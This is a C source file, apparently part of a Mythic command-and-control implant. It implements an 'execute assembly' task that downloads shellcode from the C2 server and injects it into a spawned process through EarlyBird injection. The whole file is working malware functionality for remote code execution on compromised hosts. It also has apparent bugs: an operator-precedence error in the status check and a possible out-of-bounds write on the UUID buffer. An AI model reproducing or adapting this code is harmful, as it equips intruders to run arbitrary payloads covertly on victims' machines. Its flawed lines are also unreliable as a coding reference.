#include "Tasks/ExecuteAssembly.h"


#ifdef INCLUDE_CMD_EXECUTE_ASSEMBLY

#include "Package.h"
#include "Parser.h"
#include "Task.h"
#include "Config.h"
#include "Mythic.h"
#include "Inject.h"


VOID ExecuteAssembly(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
{
    /*
        1. Parse arguments
        2. fetch assembly shellcode file
        3. Spawn and inject the shellcode
        4. Get the output
    */
    /* Parse BOF arguments */
    UINT32 nbArg = ParserGetInt32(arguments);
    _dbg("GOT %d arguments", nbArg);

    DWORD  Status;
    SIZE_T uuidLen              = 0;
    DWORD  filesize             = 0;
    MYTHIC_FILE AssemblyStub    = { 0 };

    PCHAR  fileUuid  = ParserGetString(arguments, &uuidLen);

    strncpy(AssemblyStub.fileUuid, fileUuid, TASK_UUID_SIZE + 1);
    AssemblyStub.fileUuid[TASK_UUID_SIZE + 1] = '\0';

    _dbg("FOUND FILE UUID %s", AssemblyStub.fileUuid);

    /* Fetch file from Mythic */
    if (Status = MythicGetFileBytes(taskUuid, &AssemblyStub) != 0)
    {
        _err("Failed to fetch file from Mythic server.");
        PackageError(taskUuid, Status);
        return;
    }

    /* Spawn and Inject the Assembly Stub into a Process */
    if(!InjectProcessViaEarlyBird((PBYTE)AssemblyStub.buffer, AssemblyStub.size)) {
        _err("Failed to inject process with assembly shellcode");
    }

    
    PackageComplete(taskUuid, NULL);

}


#endif  //INCLUDE_CMD_EXECUTE_ASSEMBLY